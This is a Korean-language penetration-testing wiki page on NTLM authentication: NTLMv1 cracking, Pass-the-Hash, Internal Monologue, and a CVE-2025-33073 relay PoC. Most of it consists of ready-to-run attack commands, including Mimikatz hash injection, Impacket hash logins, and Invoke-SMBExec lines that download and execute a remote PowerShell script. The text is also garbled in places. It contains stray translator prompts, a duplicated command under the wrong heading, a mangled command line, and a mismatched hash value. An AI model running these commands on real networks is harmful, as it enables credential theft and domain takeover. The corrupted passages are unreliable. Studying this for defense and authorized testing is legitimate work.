# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 기본 정보

**Windows XP 및 Server 2003**이 사용되는 환경에서는 LM (Lan Manager) hash가 사용되지만, 이러한 hash가 쉽게 손상될 수 있다는 점은 널리 알려져 있습니다. 특정 LM hash인 `AAD3B435B51404EEAAD3B435B51404EE`는 LM이 사용되지 않는 상황을 나타내며, 빈 문자열에 대한 hash입니다.

기본적으로 **Kerberos** authentication protocol이 주요 방식으로 사용됩니다. 다음과 같은 특정 상황에서는 NTLM (NT LAN Manager)이 사용됩니다: Active Directory가 없는 경우, domain이 존재하지 않는 경우, 잘못된 구성으로 인해 Kerberos가 정상적으로 작동하지 않는 경우, 또는 유효한 hostname 대신 IP address를 사용하여 connection을 시도하는 경우입니다.

Network packet에 **"NTLMSSP"** header가 있으면 NTLM authentication process가 진행 중임을 나타냅니다.

Authentication protocol인 LM, NTLMv1 및 NTLMv2에 대한 support는 `%windir%\Windows\System32\msv1\_0.dll`에 위치한 특정 DLL을 통해 제공됩니다.

**주요 사항**:

- LM hash는 취약하며, 빈 LM hash (`AAD3B435B51404EEAAD3B435B51404EE`)는 LM이 사용되지 않음을 의미합니다.
- Kerberos는 기본 authentication method이며, NTLM은 특정 조건에서만 사용됩니다.
- NTLM authentication packet은 "NTLMSSP" header로 식별할 수 있습니다.
- LM, NTLMv1 및 NTLMv2 protocol은 system file `msv1\_0.dll`에서 지원됩니다.

## LM, NTLMv1 및 NTLMv2

사용할 protocol을 확인하고 구성할 수 있습니다:

### GUI

_secpol.msc_를 실행합니다 -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 0부터 5까지 총 6개의 level이 있습니다.

![LM, NTLMv1 및 NTLMv2 - GUI: secpol.msc 실행 - Local policies - Security Options - Network Security: LAN Manager authentication level. 0부터 5까지 총 6개의 level이 있습니다](<../../images/image (919).png>)

### Registry

다음 설정은 level 5로 지정합니다:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
가능한 값:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 기본 NTLM Domain 인증 Scheme

1. **user**가 자신의 **credentials**를 입력합니다.
2. 클라이언트 머신이 **domain name**과 **username**을 전송하여 **authentication request**를 보냅니다.
3. **server**가 **challenge**를 보냅니다.
4. **client**가 password의 hash를 key로 사용하여 **challenge**를 암호화하고 response로 전송합니다.
5. **server**가 **domain name, username, challenge 및 response**를 **Domain controller**로 전송합니다. **Active Directory**가 구성되어 있지 않거나 domain name이 server의 이름인 경우에는 **credentials**가 로컬에서 **checked**됩니다.
6. **domain controller**가 **everything is correct**인지 확인하고 해당 정보를 server로 보냅니다.

**server**와 **Domain Controller**는 **Netlogon** server를 통해 **Secure Channel**을 생성할 수 있습니다. Domain Controller가 server의 password를 알고 있기 때문입니다(password는 **NTDS.DIT** db 내부에 있습니다).

### Local NTLM authentication Scheme

인증 방식은 앞에서 언급한 것과 동일하지만, **server**는 **SAM** file 내부에서 인증을 시도하는 **user**의 **hash**를 알고 있습니다. 따라서 **Domain Controller**에 요청하는 대신 **server**가 user의 인증 가능 여부를 직접 확인합니다.

### NTLMv1 Challenge

**challenge length는 8 bytes**이고 **response는 24 bytes**입니다.

**NT hash(16bytes)**는 **각각 7bytes인 3개의 부분**(7B + 7B + (2B+0x00\*5))으로 나뉩니다. **마지막 부분은 zeros로 채워집니다**. 그런 다음 각 부분을 사용하여 **challenge**를 별도로 **ciphered**하고, **resulting** ciphered bytes를 결합합니다. 총합: 8B + 8B + 8B = 24Bytes.

**Problems**:

- **randomness** 부족
- 3개의 부분을 별도로 **attacked**하여 NT hash를 찾을 수 있음
- **DES는 crackable**
- 3º key는 항상 **5개의 zeros**로 구성됨
- 동일한 **challenge**가 주어지면 **response**도 동일해집니다. 따라서 victim에게 "**1122334455667788**" 문자열을 **challenge**로 제공하고, 미리 계산된 rainbow tables를 사용하여 response를 공격할 수 있습니다.

### NTLMv1 attack

Unconstrained delegation은 최신 환경에서 덜 일반적이지만, 접근 가능한 **Print Spooler service**를 악용하여 이러한 host로 authentication을 강제할 수 있습니다.

AD에서 이미 보유한 일부 credentials/sessions를 악용하여 **printer가 사용자가 제어하는 일부 host**에 대해 **authenticate**하도록 요청할 수 있습니다. 그런 다음 `metasploit auxiliary/server/capture/smb` 또는 `responder`를 사용하여 **authentication challenge를 1122334455667788로 설정**하고, authentication 시도를 capture할 수 있습니다. 해당 시도가 **NTLMv1**을 사용하여 수행되었다면 이를 **crack**할 수 있습니다.\
`responder`를 사용하는 경우 **authentication**을 **downgrade**하기 위해 **flag `--lm`을 사용**해 볼 수 있습니다.\
_이 technique에서는 authentication이 NTLMv1을 사용하여 수행되어야 합니다(NTLMv2는 유효하지 않음)._

printer는 authentication 중에 computer account를 사용하며, computer accounts는 **long and random passwords**를 사용하므로 일반적인 **dictionaries**를 사용해서는 이를 **crack**할 수 없을 가능성이 높다는 점을 기억하세요. 하지만 **NTLMv1** authentication은 **DES**를 사용하므로([자세한 정보는 여기](#ntlmv1-challenge)), DES cracking에 특별히 전용된 일부 services를 사용하면 이를 crack할 수 있습니다(예를 들어 [https://crack.sh/](https://crack.sh) 또는 [https://ntlmv1.com/](https://ntlmv1.com)을 사용할 수 있습니다).

### NTLMv1 attack with hashcat

NTLMv1은 capture된 NTLMv1 messages를 Hashcat에 적합한 formats로 변환하는 [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi)을 사용하여 공격할 수도 있습니다.<sup>[[1]](#references)</sup>

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
번역할 원문을 보내 주세요.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcat을 실행하세요(그렇지 않으면 며칠이 걸리므로 hashtopolis와 같은 도구를 통한 distributed 실행이 가장 좋습니다).
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
이 경우에는 비밀번호가 password라는 것을 알고 있으므로 데모를 위해 편법을 사용하겠습니다:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
이제 hashcat-utilities를 사용하여 크랙된 DES 키를 NTLM 해시의 일부로 변환해야 합니다:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
번역할 마지막 부분의 원문을 보내 주세요.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
번역할 내용을 보내 주세요.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length는 8 bytes이며**, **2개의 response가 전송됩니다**: 하나는 **24 bytes** 길이이고, **다른 하나의 길이는 가변적**입니다.

**첫 번째 response**는 **NT hash**의 **hash MD4**를 **key**로 사용하고, **client와 domain으로 구성된 문자열**에 HMAC_MD5를 사용해 ciphering하여 생성됩니다. 그런 다음 **result**를 **key**로 사용해 **challenge**에 HMAC_MD5를 사용하여 ciphering합니다. 여기에 **8 bytes의 client challenge**가 추가됩니다. 총 길이: 24 B.

**두 번째 response**는 **여러 값**(새로운 client challenge, **replay attacks**를 방지하기 위한 **timestamp** 등)을 사용하여 생성됩니다.

**성공한 authentication exchange가 포함된 PCAP**이 있다면, domain, username, server challenge, NTLMv2 response를 추출하고, Hashcat용으로 capture를 format한 다음 mode `5600`을 사용하여 password recovery를 시도할 수 있습니다. 보관된 실습 walkthrough에는 packet-field extraction 절차가 유지되어 있으며, Hashcat의 examples에는 현재 허용되는 format이 정의되어 있습니다.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**victim의 hash를 확보하면**, 이를 사용하여 victim을 **impersonate**할 수 있습니다.\
해당 **hash를 사용하여** **NTLM authentication을 수행할** **tool**을 사용하거나, 새로운 **sessionlogon**을 생성하고 해당 **hash를 LSASS 내부에 inject**할 수 있습니다. 그러면 **NTLM authentication이 수행될 때마다**, 해당 **hash가 사용됩니다.** 마지막 옵션이 mimikatz가 수행하는 작업입니다.

**Computer accounts를 사용하여 Pass-the-Hash attacks를 수행할 수도 있다는 점을 기억하세요.**

### **Mimikatz**

**administrator 권한으로 실행해야 합니다**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
현재 로컬 사용자로 프로세스를 실행하며, LSASS는 제공된 credentials를 outbound network logon에 연결합니다. 그런 다음 평문 password를 알지 못해도 `runas /netonly`와 유사하게 제공된 사용자로 network resources에 access할 수 있습니다.

### Linux에서 Pass-the-Hash

Linux에서 Pass-the-Hash를 사용하여 Windows machines에서 code execution을 수행할 수 있습니다.\
[**실용적인 Pass-the-Hash execution examples를 참조하세요.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows compiled tools

[여기에서 Windows용 impacket binaries를 다운로드할 수 있습니다](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (이 경우 command를 지정해야 하며, cmd.exe와 powershell.exe는 interactive shell을 얻는 데 유효하지 않습니다)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 그 밖에도 여러 Impacket binaries가 있습니다...

### Invoke-TheHash

여기에서 powershell scripts를 가져올 수 있습니다: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

이 함수는 앞서 나온 모드들을 결합합니다. **여러 호스트**를 전달하고, 선택한 대상은 제외하며, _SMBExec, WMIExec, SMBClient,_ 또는 _SMBEnum_을 선택할 수 있습니다. _**Command**_ parameter 없이 **SMBExec** 또는 **WMIExec**을 선택하면 충분한 권한이 있는지만 확인합니다.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**관리자 권한으로 실행해야 함**

이 tool은 mimikatz와 동일한 작업을 수행합니다(LSASS memory 수정).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### username과 password를 사용한 수동 Windows 원격 실행


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host에서 credentials 추출

자세한 내용은 [**Stealing Windows Credentials**](../stealing-credentials/README.md)을 참조하세요.

## Internal Monologue attack

Internal Monologue Attack은 공격자가 **LSASS process와 직접 상호작용하지 않고도** victim의 machine에서 NTLM hashes를 가져올 수 있도록 하는 stealthy credential extraction technique입니다. hashes를 memory에서 직접 읽기 때문에 endpoint security solutions나 Credential Guard에 의해 자주 차단되는 Mimikatz와 달리, 이 attack은 **Security Support Provider Interface (SSPI)를 통한 NTLM authentication package (MSV1_0)에 대한 local calls**를 활용합니다. 먼저 공격자는 NetNTLMv1이 허용되도록 **NTLM settings**(예: LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic)를 **downgrade**합니다. 그런 다음 running processes에서 얻은 기존 user tokens를 impersonate하고, 로컬에서 NTLM authentication을 trigger하여 알려진 challenge를 사용한 NetNTLMv1 responses를 생성합니다.<sup>[[4]](#references)</sup>

이러한 NetNTLMv1 responses를 capture한 후, 공격자는 **precomputed rainbow tables**를 사용하여 원래 NTLM hashes를 빠르게 복구할 수 있으며, 이를 통해 lateral movement를 위한 추가적인 Pass-the-Hash attacks를 수행할 수 있습니다. 중요한 점은 Internal Monologue Attack이 network traffic을 생성하거나, code를 inject하거나, 직접적인 memory dumps를 trigger하지 않기 때문에 stealthy하다는 것입니다. 따라서 Mimikatz와 같은 traditional methods에 비해 defenders가 탐지하기 어렵습니다.

강제된 security policies로 인해 NetNTLMv1이 허용되지 않는 경우 공격자는 NetNTLMv1 response를 가져오는 데 실패할 수 있습니다.

이 경우를 처리하기 위해 Internal Monologue tool이 업데이트되었습니다. `AcceptSecurityContext()`를 사용하여 server token을 동적으로 획득하므로 NetNTLMv1이 실패하더라도 **NetNTLMv2 responses를 capture**할 수 있습니다. NetNTLMv2는 crack하기 훨씬 어렵지만, 제한적인 경우 relay attacks 또는 offline brute-force를 수행할 수 있는 경로를 여전히 제공합니다.

PoC는 **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**에서 확인할 수 있습니다.<sup>[[4]](#references)</sup>

## NTLM Relay 및 Responder

**이러한 attacks를 수행하는 방법에 대한 더 자세한 guide는 여기에서 확인하세요:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## network capture에서 NTLM challenges 파싱

**다음을 사용할 수 있습니다:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPNs를 통한 NTLM 및 Kerberos *Reflection* (CVE-2025-33073)

Windows에는 host에서 시작된 NTLM (또는 Kerberos) authentication을 **동일한** host로 relay하여 SYSTEM privileges를 획득하는 *reflection* attacks를 방지하기 위한 여러 mitigations가 포함되어 있습니다.

Microsoft는 MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) 및 이후 patches를 통해 대부분의 public chains를 차단했습니다. 그러나 **CVE-2025-33073**은 *marshalled* (serialized) target-info를 포함하는 **SMB client의 Service Principal Names (SPNs) truncation** 방식을 악용하면 protections를 여전히 우회할 수 있음을 보여줍니다.<sup>[[5]](#references)[[6]](#references)</sup>

### bug TL;DR
1. 공격자는 marshalled SPN을 encode하는 label을 가진 **DNS A-record**를 등록합니다. 예:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. victim이 해당 hostname으로 authenticate하도록 coerce합니다 (PetitPotam, DFSCoerce 등).
3. SMB client가 target string `cifs/srv11UWhRCAAAAA…`를 `lsasrv!LsapCheckMarshalledTargetInfo`에 전달하면 `CredUnmarshalTargetInfo` 호출이 **serialized blob을 strip**하여 **`cifs/srv1`**만 남깁니다.
4. 이제 `msv1_0!SspIsTargetLocalhost` (또는 이에 해당하는 Kerberos 기능)는 짧아진 host part가 computer name (`SRV1`)과 일치하기 때문에 target을 *localhost*로 간주합니다.
5. 그 결과 server는 `NTLMSSP_NEGOTIATE_LOCAL_CALL`을 설정하고 **LSASS의 SYSTEM access-token**을 context에 inject합니다 (Kerberos의 경우 SYSTEM-marked subsession key가 생성됩니다).
6. 해당 authentication을 `ntlmrelayx.py` **또는** `krbrelayx.py`로 relay하면 동일한 host에서 full SYSTEM rights를 얻을 수 있습니다.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### 패치 및 완화
* **CVE-2025-33073**용 KB 패치는 `mrxsmb.sys::SmbCeCreateSrvCall`에 검사를 추가하여, 대상에 marshalled info가 포함된 모든 SMB 연결(`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`)을 차단합니다.<sup>[[5]](#references)[[6]](#references)</sup>
* 패치가 적용되지 않은 호스트에서도 reflection을 방지하려면 **SMB signing**을 적용합니다.
* `*<base64>...*`와 유사한 DNS 레코드를 모니터링하고 coercion vector(PetitPotam, DFSCoerce, AuthIP...)를 차단합니다.

### 탐지 아이디어
* client IP ≠ server IP인 `NTLMSSP_NEGOTIATE_LOCAL_CALL`이 포함된 네트워크 캡처.
* subsession key와 hostname과 동일한 client principal이 포함된 Kerberos AP-REQ.
* 동일한 호스트에서 발생한 원격 SMB 쓰기 직전에 수행된 Windows Event 4624/4648 SYSTEM logon.<sup>[[5]](#references)</sup>

`NT AUTHORITY\SYSTEM`에 도달하기 위해 **SMB arbitrary ports**와 **TCP connection reuse**를 악용하는 **March 2026** local reflection variant는 다음을 참조하세요:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multi 도구](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat 예제 해시 – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash 유틸리티](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS에 접근하지 않고 NTLM 해시 가져오기](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection은 죽었다, NTLM Reflection이여 영원하라!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 해시 크래킹 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
